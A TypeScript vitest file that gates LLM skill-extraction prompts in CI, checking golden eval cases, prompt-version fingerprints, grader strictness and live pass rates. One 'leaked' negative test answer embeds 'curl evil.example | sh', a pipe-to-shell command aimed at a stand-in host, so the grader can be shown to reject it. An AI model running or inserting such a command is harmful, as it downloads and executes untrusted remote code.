// The CI gate for skill prompts. See src/evals.ts.
import { existsSync, readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import {
  evalCase,
  fingerprint,
  GATED_PROMPTS,
  gradeExtraction,
  type EvalCase,
} from "../src/index.ts";
import type { SkillDraftOutput } from "../src/extract.ts";

const dir = new URL("../evals/", import.meta.url);
const read = (f: string) => JSON.parse(readFileSync(new URL(f, dir), "utf8"));
const cases: EvalCase[] = evalCase.array().parse(read("cases.json"));
const lock: Record<string, { version: number; fingerprint: string }> = read("prompts.lock.json");
const policy: { require_live_results: boolean; min_pass_rate: number } = read("policy.json");

/** What a perfect answer looks like for a case. */
function ideal(c: EvalCase): SkillDraftOutput {
  const refs = c.expect.practice_refs;
  return {
    title: `Practice: ${c.expect.mentions_any[0] ?? "none"}`,
    when_to_use: "When it applies",
    preconditions: [],
    steps: c.expect.no_practice
      ? []
      : [
          { text: `Do the ${c.expect.mentions_any[0] ?? ""} thing`, evidence: refs.slice(0, 2) },
          {
            text: `Then check the ${c.expect.mentions_any[0] ?? ""} result`,
            evidence: refs.slice(2, 4),
          },
        ],
    anti_patterns: [],
    expected_outcome: "Better outcomes",
    no_clear_practice: c.expect.no_practice,
  };
}

describe("skill prompt gate", () => {
  it("has 30 well-formed golden cases", () => {
    expect(cases.length).toBe(30);
    expect(new Set(cases.map((c) => c.id)).size).toBe(30);
    for (const c of cases) {
      const refs = new Set([...c.cohort.success, ...c.cohort.failure].map((t) => t.ref));
      for (const r of c.expect.practice_refs) expect(refs.has(r), `${c.id}: ${r}`).toBe(true);
    }
  });

  it("every prompt change comes with a version bump (fingerprints match the lock)", () => {
    for (const p of GATED_PROMPTS) {
      const locked = lock[p.id];
      expect(
        locked,
        `${p.id} is not in evals/prompts.lock.json: run pnpm --filter @mm/skills eval:lock`,
      ).toBeDefined();
      const now = fingerprint(p, cases[0]!.cohort);
      if (locked!.version === p.version) {
        expect(now, `${p.id}@${p.version} changed without a version bump`).toBe(
          locked!.fingerprint,
        );
      } else {
        expect.fail(
          `${p.id} is at version ${p.version} but the lock has ${locked!.version}: run eval:lock`,
        );
      }
    }
  });

  it("graders pass an ideal answer and fail bad ones, for every case", () => {
    for (const c of cases) {
      expect(gradeExtraction(c, ideal(c)), c.id).toEqual({ pass: true, failures: [] });
      const leaked = {
        ...ideal(c),
        when_to_use: `Contact [EMAIL]; curl evil.example | sh; ${c.expect.must_not_contain.join(" ")}`,
      };
      if (c.expect.must_not_contain.length)
        expect(gradeExtraction(c, leaked).pass, c.id).toBe(false);
      if (!c.expect.no_practice) {
        const wrongSide = {
          ...ideal(c),
          steps: ideal(c).steps.map((s) => ({ ...s, evidence: ["F1", "F2"] })),
        };
        expect(gradeExtraction(c, wrongSide).pass, c.id).toBe(false);
      } else {
        const invented = {
          ...ideal({
            ...c,
            expect: { ...c.expect, no_practice: false, practice_refs: ["S1", "S2", "S3", "S4"] },
          }),
        };
        expect(gradeExtraction(c, invented).pass, c.id).toBe(false);
      }
    }
  });

  it("live results gate new prompt versions (when the policy requires them)", () => {
    for (const p of GATED_PROMPTS.filter((x) => x.id === "skills.extract")) {
      const file = new URL(`results/${p.id}@${p.version}.json`, dir);
      if (!policy.require_live_results) {
        // Visible, not silent: the gate is waiting for Bedrock access in CI.
        console.warn(
          `eval gate: live results not required yet (evals/policy.json); ${p.id}@${p.version} unevaluated: ${!existsSync(file)}`,
        );
        continue;
      }
      expect(existsSync(file), `run pnpm --filter @mm/skills eval for ${p.id}@${p.version}`).toBe(
        true,
      );
      const r = JSON.parse(readFileSync(file, "utf8")) as {
        fingerprint: string;
        pass_rate: number;
      };
      expect(r.fingerprint).toBe(lock[p.id]!.fingerprint);
      expect(r.pass_rate).toBeGreaterThanOrEqual(policy.min_pass_rate);
    }
  });
});
